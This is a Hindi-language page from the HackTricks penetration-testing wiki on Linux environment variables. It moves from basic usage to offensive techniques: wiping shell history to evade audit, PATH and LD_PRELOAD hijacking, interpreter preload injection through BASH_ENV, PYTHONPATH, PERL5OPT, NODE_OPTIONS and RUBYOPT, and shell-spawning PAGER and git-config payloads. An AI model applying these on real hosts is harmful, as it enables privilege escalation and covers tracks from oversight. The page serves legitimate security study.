# Linux Environment Variables

{{#include ../../banners/hacktricks-training.md}}

## Global variables

Global variables को **child processes** द्वारा inherit **किया जाएगा**।

आप यह करके अपने वर्तमान session के लिए एक global variable बना सकते हैं:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
यह variable आपके वर्तमान sessions और उनकी child processes द्वारा accessible होगा।

आप निम्न कार्य करके किसी variable को **remove** कर सकते हैं:
```bash
unset MYGLOBAL
```
## स्थानीय variables

**स्थानीय variables** को केवल **current shell/script** द्वारा ही **access** किया जा सकता है।
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## वर्तमान variables की सूची
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
`/proc/*/environ` की सामग्री **NUL-separated** होती है, इसलिए ये variants आमतौर पर पढ़ने में आसान होते हैं:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
यदि आप inherited environments के अंदर **credentials** या **interesting service configuration** खोज रहे हैं, तो [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) भी देखें।

## Common variables

स्रोत: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)<sup>[[5]](#references)</sup>

- **DISPLAY** – **X** द्वारा उपयोग किया जाने वाला display। यह variable आमतौर पर **:0.0** पर set होता है, जिसका अर्थ current computer पर पहला display है।
- **EDITOR** – user का पसंदीदा text editor।
- **HISTFILESIZE** – history file में मौजूद lines की अधिकतम संख्या।
- **HISTSIZE** – user के session समाप्त करने पर history file में जोड़ी जाने वाली lines की संख्या।
- **HOME** – आपकी home directory।
- **HOSTNAME** – computer का hostname।
- **LANG** – आपकी current language।
- **MAIL** – user के mail spool का location। आमतौर पर **/var/spool/mail/USER**।
- **MANPATH** – manual pages के लिए search की जाने वाली directories की list।
- **OSTYPE** – operating system का type।
- **PS1** – bash में default prompt।
- **PATH** – उन सभी directories का path store करता है जिनमें वे binary files होती हैं जिन्हें आप file का नाम specify करके, relative या absolute path दिए बिना, execute करना चाहते हैं।
- **PWD** – current working directory।
- **SHELL** – current command shell का path (उदाहरण के लिए, **/bin/bash**)।
- **TERM** – current terminal type (उदाहरण के लिए, **xterm**)।
- **TZ** – आपका time zone।
- **USER** – आपका current username।

## Hacking के लिए interesting variables

हर variable समान रूप से उपयोगी नहीं होता। Offensive perspective से उन variables को प्राथमिकता दें जो **search paths**, **startup files**, **dynamic linker behavior** या **audit/logging** को बदलते हैं।

### **HISTFILESIZE**

**इस variable की value को 0 में बदलें**, ताकि जब आप **अपना session समाप्त करें**, तो **history file** (\~/.bash_history) **0 lines तक truncate** हो जाए।
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

इस **variable की value को 0** में बदलें, ताकि commands **in-memory history में सुरक्षित न रहें** और उन्हें **history file** (\~/.bash_history) में वापस न लिखा जाए।
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

यदि **इस variable की value `ignorespace` या `ignoreboth` पर set है**, तो शुरुआत में extra space वाली कोई भी command history में save नहीं की जाएगी।
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

**history file** को **`/dev/null`** पर point करें या इसे पूरी तरह unset करें। यह आमतौर पर केवल **history size** बदलने से अधिक reliable होता है।
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

**Processes** यहां घोषित **proxy** का उपयोग करके **http या https** के माध्यम से इंटरनेट से connect होंगी।
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy और no_proxy

- `all_proxy`: उन tools/protocols के लिए default proxy जो इसे honor करते हैं।
- `no_proxy`: bypass list (hosts/domains/CIDRs) जिन्हें सीधे connect करना चाहिए।
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Tool के आधार पर lowercase और uppercase variants का उपयोग किया जा सकता है (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`)।

### SSL_CERT_FILE & SSL_CERT_DIR

Processes **इन env variables** में दिए गए certificates पर trust करेंगे। यह **`curl`**, **`git`**, Python HTTP clients या package managers जैसे tools को attacker द्वारा controlled CA पर trust कराने के लिए उपयोगी है (उदाहरण के लिए, interception proxy को legitimate दिखाने के लिए)।
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

यदि कोई privileged wrapper/script commands को **absolute paths** के बिना execute करता है, तो `PATH` में attacker-controlled पहला directory प्राथमिकता पाता है। यही `sudo`, cron jobs, shell wrappers और custom SUID helpers में होने वाले कई **PATH hijacks** का आधार है। `env_keep+=PATH`, कमजोर `secure_path`, या ऐसे wrappers खोजें जो `tar`, `service`, `cp`, `python` आदि को नाम से call करते हैं।
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
For full privilege-escalation chains abusing `PATH`, check [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` केवल directory reference नहीं है: कई tools `$HOME` या `$XDG_CONFIG_HOME` से **dotfiles**, **plugins**, और **प्रति-user configuration** स्वतः load करते हैं। यदि कोई privileged workflow इन values को preserve करता है, तो **config injection**, binary hijacking की तुलना में आसान हो सकता है।
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
रोचक targets में `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py`, और `.terraformrc` जैसी tool-specific files शामिल हैं।

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

ये variables **dynamic linker** को प्रभावित करते हैं:

- `LD_PRELOAD`: अतिरिक्त shared objects को पहले load करने के लिए force करता है।
- `LD_LIBRARY_PATH`: library search directories को prepend करता है।
- `LD_AUDIT`: library loading और symbol resolution को observe करने वाली auditor libraries को load करता है।

यदि कोई privileged command इन्हें preserve करती है, तो ये **hooking**, **instrumentation**, और **privilege escalation** के लिए अत्यंत valuable होते हैं। **secure-execution** mode (`AT_SECURE`, जैसे setuid/setgid/capabilities) में loader इनमें से कई variables को strip या restrict कर देता है। हालांकि, उस शुरुआती loader stage में मौजूद parser bugs अभी भी high-impact होते हैं, क्योंकि वे target program से **पहले** run होते हैं।<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` glibc के शुरुआती behavior (उदाहरण के लिए, allocator tunables) को बदलता है और exploit labs में बहुत उपयोगी है। यह security perspective से भी महत्वपूर्ण है क्योंकि **dynamic loader इसे बहुत जल्दी parse करता है**। 2023 का **Looney Tunables** bug इस बात की अच्छी याद दिलाता है कि loader में parse किया गया एक single environment variable SUID programs के विरुद्ध **local privilege-escalation primitive** बन सकता है।<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

यदि **Bash** को **non-interactively** शुरू किया जाता है, तो यह `BASH_ENV` की जाँच करता है और target script चलाने से पहले उस फ़ाइल को source करता है। जब Bash को `sh` के रूप में invoke किया जाता है, या POSIX-style interactive mode में चलाया जाता है, तो `ENV` से भी consult किया जा सकता है। यदि environment attacker के नियंत्रण में हो, तो shell wrapper को code execution में बदलने का यह एक classic तरीका है।
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash स्वयं इन startup files को disable कर देता है जब **real/effective IDs अलग होते हैं**, जब तक कि `-p` का उपयोग न किया जाए, इसलिए सटीक व्यवहार इस बात पर निर्भर करता है कि wrapper shell को कैसे invoke करता है। उन privileged wrappers से सावधान रहें जो Bash लॉन्च करने **से पहले** `setuid()`/`setgid()` call करते हैं: IDs के दोबारा match हो जाने पर Bash `BASH_ENV`, `ENV` और संबंधित shell state पर भरोसा कर सकता है, जिन्हें अन्यथा ignore कर दिया जाता।<sup>[[1]](#references)</sup>

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

ये variables Python के start होने के तरीके को बदलते हैं:

- `PYTHONPATH`: import search paths को prepend करता है।
- `PYTHONHOME`: standard library tree को relocate करता है।
- `PYTHONSTARTUP`: interactive prompt से पहले एक file execute करता है।
- `PYTHONINSPECT=1`: script समाप्त होने के बाद interactive mode में चला जाता है।

ये maintenance scripts, debuggers, shells और ऐसे wrappers के विरुद्ध उपयोगी हैं जो controllable environment के साथ Python call करते हैं। `python -E` और `python -I` सभी `PYTHON*` variables को ignore करते हैं।
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
एक हालिया वास्तविक उदाहरण Ubuntu/Debian systems पर 2024 का **needrestart** LPE था: root-owned scanner ने `/proc/<PID>/environ` से unprivileged process का `PYTHONPATH` कॉपी किया और फिर Python execute किया। प्रकाशित exploit ने attacker-controlled path में `importlib/__init__.so` रखा, ताकि Python अपने initialization के दौरान attacker code execute करे, इससे पहले कि helper की hard-coded script का कोई महत्व होता।<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl में भी startup variables उतने ही उपयोगी हैं:

- `PERL5LIB`: library directories को prepend करता है।
- `PERL5OPT`: switches को ऐसे inject करता है, जैसे वे हर `perl` command line में मौजूद हों।

इससे **automatic module loading** को मजबूर किया जा सकता है या target script के कोई महत्वपूर्ण कार्य करने से पहले interpreter behavior बदला जा सकता है। Perl इन variables को **taint / setuid / setgid** contexts में ignore करता है, लेकिन सामान्य root-run wrappers, CI jobs, installers और custom sudoers rules के लिए ये अब भी बहुत महत्वपूर्ण हैं।
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` environment को inherit करने वाली हर `node` process में **Node.js CLI flags** को पहले से जोड़ता है। इससे यह उन wrappers, CI jobs, Electron helpers और sudo rules के विरुद्ध उपयोगी बन जाता है जो अंततः Node को invoke करते हैं। Offensive दृष्टिकोण से आमतौर पर सबसे दिलचस्प flags हैं:

- `--require <file>`: target script से पहले एक CommonJS file को preload करता है।
- `--import <module>`: target script से पहले एक ES module को preload करता है।

Node `NODE_OPTIONS` में कुछ खतरनाक flags को अस्वीकार करता है, लेकिन `--require` और `--import` स्पष्ट रूप से allowed हैं और इन्हें regular command-line arguments से **पहले** process किया जाता है।<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
Remote gadget chains के लिए जो `NODE_OPTIONS` को अप्रत्यक्ष रूप से सेट करते हैं (उदाहरण के लिए, prototype-pollution से RCE), [इस दूसरे पेज](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md) को देखें।

### **RUBYLIB & RUBYOPT**

Ruby startup abuse की यही श्रेणी प्रदान करता है:

- `RUBYLIB`: Ruby के load path में directories को prepend करता है।
- `RUBYOPT`: प्रत्येक `ruby` invocation में `-r` जैसे command-line options inject करता है।
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
2024 की **needrestart** vulnerabilities ने दिखाया कि यह केवल lab trick नहीं है: वही root-owned helper जो `PYTHONPATH` abuse के प्रति vulnerable था, उसे attacker-controlled `RUBYLIB` के साथ Ruby चलाने के लिए भी coerced किया जा सकता था, जिससे attacker directory से `enc/encdb.so` load हुआ।<sup>[[3]](#references)</sup>

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

कुछ tools केवल environment से path read नहीं करते; वे value को **shell**, **editor**, या **input preprocessor** को pass करते हैं। इसलिए निम्न variables विशेष रूप से interesting होते हैं, जब कोई privileged wrapper `git`, `man`, `less`, या इसी तरह के text viewers को run करता है:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: pager command चुनते हैं।
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: editor command चुनते हैं, अक्सर arguments के साथ।
- `LESSOPEN`, `LESSCLOSE`: वे pre/post-processors define करते हैं जो `less` द्वारा file open करने पर run होते हैं।
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, और `GIT_CONFIG_VALUE_<n>` के जरिए disk को छुए बिना **env-only config injection** भी support करता है:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Post-exploitation के दृष्टिकोण से यह भी याद रखें कि inherited environments में अक्सर **credentials**, **proxy settings**, **service tokens**, या **cloud keys** मौजूद होते हैं। `/proc/<PID>/environ` और `systemd` `Environment=` hunting के लिए [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) देखें।

### PS1

अपने prompt का रूप बदलें।

[**यह एक उदाहरण है**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: यह एक उदाहरण है](<../images/image (897).png>)

Regular user:

![PERL5OPT & PERL5LIB - PS1: एक, दो और तीन backgrounded jobs](<../images/image (740).png>)

एक, दो और तीन backgrounded jobs:

![PERL5OPT & PERL5LIB - PS1: एक, दो और तीन backgrounded jobs](<../images/image (145).png>)

एक background job, एक stopped और last command सही ढंग से पूरा नहीं हुआ:

![PERL5OPT & PERL5LIB - PS1: एक background job, एक stopped और last command सही ढंग से पूरा नहीं हुआ](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Bash Startup Files](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs in needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI documentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Common environment variables - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Local Privilege Escalation in the glibc's ld.so - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)

{{#include ../../banners/hacktricks-training.md}}
